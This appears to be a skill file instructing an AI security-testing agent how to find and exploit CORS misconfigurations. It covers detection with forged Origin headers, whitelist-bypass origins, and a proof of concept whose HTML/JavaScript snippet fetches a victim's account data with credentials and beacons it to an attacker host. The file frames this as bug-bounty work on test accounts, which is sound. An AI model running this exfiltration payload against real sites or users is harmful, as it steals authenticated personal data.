---
name: cors
description: "Exploitable CORS misconfig -> cross-origin theft of authenticated data. Use when an endpoint returns sensitive data with Access-Control-Allow-Origin reflecting Origin, ACAO + Access-Control-Allow-Credentials:true, null origin accepted, or a weak origin-whitelist regex."
---

# CORS Misconfiguration

> **Prereq — map first:** Don't test this cold. A target attack-surface map and the relevant happy-flow baseline must exist first — run `/recon-mapper` if not. Test this class against the impact-scored candidate list (highest priority first), reuse the routed `handoff_context`, and pursue chains to real business impact over isolated low-severity bugs.


## When to test
Test an endpoint only when BOTH are true:
1. It returns **sensitive, session-scoped data** (account info, tokens, API keys, PII, CSRF tokens).
2. It emits **CORS headers** (`Access-Control-Allow-Origin`, possibly `Access-Control-Allow-Credentials`).

If the data is public or unauthenticated, CORS is almost never impactful — skip it. The whole game is *cross-origin theft of data the victim's browser is authorized to read but the attacker's origin should not be*.

## Impact & priority (be honest, be strict)
- **HIGH signal — report it** only when ALL of these hold:
  - ACAO **reflects the attacker-controlled origin** (or accepts `null`, or a bypassable whitelist), AND
  - `Access-Control-Allow-Credentials: true` is returned, AND
  - the endpoint returns **sensitive data tied to the victim's session/cookies**.
  - => Direct cross-origin data theft. Provable, high impact.
- **LOW / noise — do NOT report**: reflection or `*` without credentials and no sensitive data; permissive CORS on public/static endpoints; reflection where the endpoint requires a header/token the attacker page cannot send cross-origin.

CORS is one of the most common junk-report sources. If you cannot demonstrate actual exfiltration of sensitive victim data, it is not a finding.

## Detection
1. Send the target request with an attacker `Origin` header:
   - `Origin: https://evil.example` (arbitrary attacker domain)
2. Observe the response:
   - Does `Access-Control-Allow-Origin` echo back `https://evil.example`? (reflection)
   - Is `Access-Control-Allow-Credentials: true` present?
3. Test the `null` origin: `Origin: null` — is it reflected/accepted with credentials?
4. Probe whitelist parsing flaws:
   - Suffix: `Origin: https://eviltarget.com` against whitelist `target.com`
   - Prefix: `Origin: https://target.com.evil.example`
   - Substring/subdomain: `Origin: https://target.com.evil.example`, `https://eviltarget.com`
5. Confirm the endpoint actually returns sensitive data and that the request succeeds **with the session cookie** (i.e., `withCredentials`-equivalent).

## Exploitation
- **Reflected origin + credentials**: host an attacker page that does a `fetch`/`XHR` with `withCredentials=true` to the endpoint and exfiltrates the response. Victim must be logged in and visit the page.
- **null origin + credentials**: deliver the request from a sandboxed `<iframe>` (`sandbox="allow-scripts"` -> `data:` URL) so the browser sends `Origin: null`.
- **Trusted subdomain with XSS**: if the whitelist trusts a subdomain that has XSS, inject the exfil JS there so the request comes from a whitelisted origin.

## Common bypasses
Origin-parsing weaknesses: prefix/suffix/substring matching, unescaped dots in regex, trusting any subdomain, accepting `null`, protocol downgrade (trusting `http://` internal origins from HTTPS apps). See `reference.md` for the full catalog and walkthroughs.

## Minimal PoC (for ./_EXPLOIT/)
Step 1 — prove reflection with credentials (safe, read-only):
```bash
curl -s -i 'https://target.example/api/account' \
  -H 'Origin: https://evil.example' \
  -H 'Cookie: session=<VICTIM_SESSION>' \
  | grep -i 'access-control-allow-'
# PROOF requires:
#   Access-Control-Allow-Origin: https://evil.example
#   Access-Control-Allow-Credentials: true
```
Step 2 — the exfil snippet (host on attacker origin; log captured data to ./_EXPLOIT/):
```html
<script>
fetch('https://target.example/api/account', { credentials: 'include' })
  .then(r => r.text())
  .then(d => navigator.sendBeacon(
    'https://attacker.example/log', d));   // or fetch() to your collector
</script>
```
Log the curl proof + the responding sensitive body to `./_EXPLOIT/`. Use a test/attacker-owned account; never exfiltrate real third-party victim data.

## Don't report as noise
- `Access-Control-Allow-Origin: *` **without** `Allow-Credentials` and with no sensitive data — by design.
- Permissive CORS on public, unauthenticated, or static endpoints.
- Reflection that the browser will never honor with credentials (e.g., `ACAO: *` + `ACAC` is ignored by browsers).
- "Theoretical" reflection where you cannot actually pull sensitive session data cross-origin.

## Deep reference
See `reference.md` and https://portswigger.net/web-security/cors
